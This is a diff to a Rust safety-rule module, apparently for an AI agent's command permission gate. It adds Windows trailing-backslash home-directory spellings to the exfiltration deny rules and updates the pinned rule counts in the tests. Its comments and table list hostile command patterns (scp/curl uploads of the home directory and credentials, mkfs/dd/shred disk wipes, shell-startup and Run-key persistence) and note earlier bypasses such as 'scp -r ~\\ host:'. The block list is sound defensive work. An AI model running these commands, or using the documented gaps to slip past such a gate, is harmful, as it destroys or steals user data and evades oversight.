@@ -213,17 +213,20 @@
 //!   Mainstream denies none of them; the blanket `ssh-keygen` word denied
 //!   legitimate key generation.
 //!
-//! The final count is 8,736 rules (round-13's resolved-home trailing-slash
-//! exfil face added the +7 spellings over the older 8,729 narration; this
-//! doc line moves with the snapshot pins). v3.4 (the second review fix round)
+//! The final count is 8,742 rules (round-13's resolved-home trailing-slash
+//! exfil face added the +7 spellings over the older 8,729 narration; v3.5 —
+//! round-15 review C — adds the +6 Windows trailing-backslash tilde exfil
+//! spellings; this doc line moves with the snapshot pins). v3.4 (the second review fix round)
 //! closed the whole-home exfiltration hole — the destroy face has carried
 //! the bare home roots since v3.1 but the upload face enumerated only
 //! credential paths, so `scp -r ~ host:` exfiltrated the home root past
 //! every rule: the bare `~`/`$HOME`/`${HOME}`/`/root`/real-home roots and
 //! the enumerated roots' trailing-slash spellings join the direct-upload
 //! inventory (+63 POSIX, +12 over the Windows bare profile roots, +3 over
-//! the resolved real-home root — `~`/`$home` skipped on the Windows side
-//! as case-fold duplicates of the POSIX roots). It also unified the two
+//! the resolved real-home root; the bare `~`/`$home` tokens are skipped on
+//! the Windows side as case-fold duplicates of the POSIX roots, but their
+//! trailing-BACKSLASH spellings `~\`/`$home\` are distinct exact tokens the
+//! engine never normalizes — v3.5 enumerates them, +6). It also unified the two
 //! hand-maintained copies of the resolved Microsoft credential directories
 //! ([`win_resolved_ms_credential_dirs`] derives them from the literal
 //! [`WIN_MS_CREDENTIAL_DIRS`] — single source of truth, the 5-directory
@@ -316,7 +319,7 @@
 //! | catastrophic (R7) | 261 | `mkfs*`/`newfs*`/`diskutil erase*`/`blkdiscard` (+ `diskutil apfs deleteContainer`/`secureErase`; v3.3 dropped the phantom `mkfs.swap` for the real `msdos`/`f2fs`/`exfat` siblings; v3.4 adds `mkswap`/`mkfs.minix`/`mkfs.cramfs` — the swap face is no longer open), `dd`/`wipefs`/`shred` `* /dev/<dev>` device wipes (23 devices incl. v3.3's `vda`/`vdb`/`mmcblk0`), verb-anchored `sgdisk --zap-all`/`-Z`/`cryptsetup luksErase`/`hdparm --security-erase`, `chmod 000/777/0777/0000 <top-level>` (v3.3 added the leading-zero spellings) in bare AND trailing-slash spellings, Windows `format`/`diskpart`/`vssadmin delete shadows`/`bcdedit` |
 //! | persistence (R8) | 642 | `tee`/`cp`/`mv`/`install`/`ln`/`ditto` into shell startup files (v3.3 added the macOS `/etc/zsh{env,profile,rc}` and RHEL `/etc/bashrc` system paths), repo/config injection points, sudoers; `systemctl enable/mask`, `crontab -e/-r/-` plus the combined short-flag clusters (`-el`/`-lr`/…, v3.1), `schtasks /create`, `sc create`, `new-service`, canonical HKLM/HKCU Run-key `reg add`, `visudo` |
 //! | Windows destroy | 2,796 | `del`/`erase`/`remove-item`/`ri`/`rm`/`rd`/`rmdir`/`icacls`/`rename-item`/`rni` × the Windows spelling inventory (literal `%userprofile%`-class prefixes, backslash dirs/children/names, Microsoft credential+Vault dirs, `…\dir\*` globs) + `c:`/`d:` drive roots + the bare profile roots (the `~` and `$home` roots are not re-pushed for `rm`/`rmdir` — the case-folded POSIX destroy roots already pin the identical rules, v3.1/v3.2 dedupe) |
-//! | direct upload (v3.1, v3.2, v3.4) | 3,017 | wildcard-anchored on the sensitive token: `curl * <sp>` (any argument position — closes the URL-first hole), `curl * @<sp>`, `curl * file=@<sp>` (conventional multipart name), `wget * --post-file=<sp>` and the space-separated spelling = 5 shapes × 326 spellings; `scp`/`rsync` first-positional = 2 × 326; Windows `curl * <sp>` + `scp` + `curl * @<sp>` = 3 × 220. Flagged forms (`curl -T`, `rsync -av`) ride on the engine's flag-value skipping. v3.4: the bare home roots and their trailing-slash spellings join the source inventory — POSIX 7 shapes × 9 exfil roots (`~`/`$HOME`/`${HOME}`/`/root` + real home + the enumerated roots' trailing forms; the `/` root stays out), Windows 3 shapes × 4 bare profile roots (`~`/`$home` skipped as case-fold duplicates), and 3 shapes over the resolved real-home root (that +3 rides in the `win_real_home` family row's arithmetic, attributed here narratively). The v3 rollback had assigned this face to the (nonexistent) sandbox — see the v3.1 posture section |
+//! | direct upload (v3.1, v3.2, v3.4, v3.5) | 3,023 | wildcard-anchored on the sensitive token: `curl * <sp>` (any argument position — closes the URL-first hole), `curl * @<sp>`, `curl * file=@<sp>` (conventional multipart name), `wget * --post-file=<sp>` and the space-separated spelling = 5 shapes × 326 spellings; `scp`/`rsync` first-positional = 2 × 326; Windows `curl * <sp>` + `scp` + `curl * @<sp>` = 3 × 220. Flagged forms (`curl -T`, `rsync -av`) ride on the engine's flag-value skipping. v3.4: the bare home roots and their trailing-slash spellings join the source inventory — POSIX 7 shapes × 9 exfil roots (`~`/`$HOME`/`${HOME}`/`/root` + real home + the enumerated roots' trailing forms; the `/` root stays out), Windows 3 shapes × 4 bare profile roots plus the v3.5 trailing-backslash tilde forms `~\`/`$home\` × 3 shapes (the bare tokens are case-fold duplicates, the backslash spellings are not), and 3 shapes over the resolved real-home root (that +3 rides in the `win_real_home` family row's arithmetic, attributed here narratively). The v3 rollback had assigned this face to the (nonexistent) sandbox — see the v3.1 posture section |
 //! | sudo | 2 | `sudo`/`sudoedit`, added/removed per `super_permission::is_enabled()` snapshot |
 //!
 //! The reader/exfil families the v2 table once carried (R1 viewer
@@ -1620,11 +1623,18 @@ fn win_exfil_credential_upload_rules() -> Vec<ToolAskRule> {
 /// composition inherits it verbatim).
 fn win_exfil_root_upload_rules() -> Vec<ToolAskRule> {
     let mut rules = Vec::new();
+    // v3.5 (round-15 review C): the trailing-BACKSLASH spellings `~\` and
+    // `$home\` are distinct exact tokens the engine never normalizes — the
+    // case-fold rationale only holds for the BARE `~`/`$home` tokens, so
+    // `scp -r ~\ host:` slipped past the Floor gate while every other
+    // whole-home spelling was denied. Enumerate them explicitly.
     for root in [
         "%userprofile%",
         "%userprofile%\\",
         "$env:userprofile",
         "$env:userprofile\\",
+        "~\\",
+        "$home\\",
     ] {
         rules.push(deny_cmd(format!("curl * {root}")));
         rules.push(deny_cmd(format!("scp {root}")));
@@ -2253,10 +2263,12 @@ mod tests {
         // joined in the round-13 review — `scp -r /home/me/ host:` was the
         // registered round-9 residue) → +70 = 2352; Windows — (curl * + scp
         // + curl * @) ×
-        // 220 = 660 + the 4 bare profile roots × 3 shapes (v3.4; `~`/`$home`
-        // skipped — the POSIX `curl * ~`/`curl * $HOME` rules are the
-        // identical strings after case folding) = +12 → 672; exfil total
-        // 3024; sudo 2 → 8736 total (counts assume the test composition:
+        // 220 = 660 + the 4 bare profile roots × 3 shapes (v3.4) = +12, plus
+        // the trailing-backslash tilde forms `~\`/`$home\` × 3 shapes (v3.5,
+        // round-15 review C — distinct exact tokens the engine never
+        // normalizes; the case-fold rationale only held for the bare
+        // spellings) = +6 → 678; exfil total
+        // 3030; sudo 2 → 8742 total (counts assume the test composition:
         // sudo off, no Windows real-home prefix, and a resolved POSIX home
         // distinct from /root; the assembly exact-dedups so no host sees
         // duplicate rule strings).
@@ -2271,7 +2283,7 @@ mod tests {
         // immediately (a >=100-style weak assertion once hid a ~78% loss).
         assert_eq!(
             rules.len(),
-            8736,
+            8742,
             "ruleset size drifted; confirm the change is intentional and update the pinned count and this breakdown"
         );
         // v3.2: the per-family breakdown above is ASSERTED, not just
@@ -2285,7 +2297,7 @@ mod tests {
         assert_eq!(persistence_rules().len(), 642);
         assert_eq!(exfil_source_rules().len(), 2352);
         assert_eq!(win_native_rules().len(), 2796);
-        assert_eq!(win_exfil_source_rules().len(), 672);
+        assert_eq!(win_exfil_source_rules().len(), 678);
         assert_eq!(win_resolved_ms_credential_dirs().len(), 5);
         assert_eq!(sudo_block_rules_for(false).len(), 2);
         let commands: Vec<&str> = rules.iter().filter_map(|r| r.command.as_deref()).collect();
@@ -2735,11 +2747,12 @@ mod tests {
     }
 
     /// Tri-mode profile seam, pinned Floor count: the Floor (Yolo lane)
-    /// composition is pinned at exactly 3,528 rules (the documented count in
-    /// `docs/safety-modes.md`; the Full profile pins 8,736 in
+    /// composition is pinned at exactly 3,534 rules (the documented count in
+    /// `docs/safety-modes.md`; the Full profile pins 8,742 in
     /// `rule_snapshot_is_stable` — both counts moved +7 with round-13's
     /// resolved-home trailing-slash exfil face over the older 3,521/8,729
-    /// narration). Same host-independent test composition as
+    /// narration, and +6 with v3.5's Windows trailing-backslash tilde
+    /// exfil spellings over the round-13 3,528/8,736). Same host-independent test composition as
     /// the Full pin: sudo state injected off, no Windows real-home prefix.
     /// Pinning the exact number turns any silent family drop/addition in the
     /// Floor lane red immediately.
@@ -2754,7 +2767,7 @@ mod tests {
         let floor = safety_rules_for_profile_with_home(SafetyRuleProfile::Floor, false, None);
         assert_eq!(
             floor.len(),
-            3528,
+            3534,
             "Floor ruleset size drifted; confirm the change is intentional and update the pinned count"
         );
     }
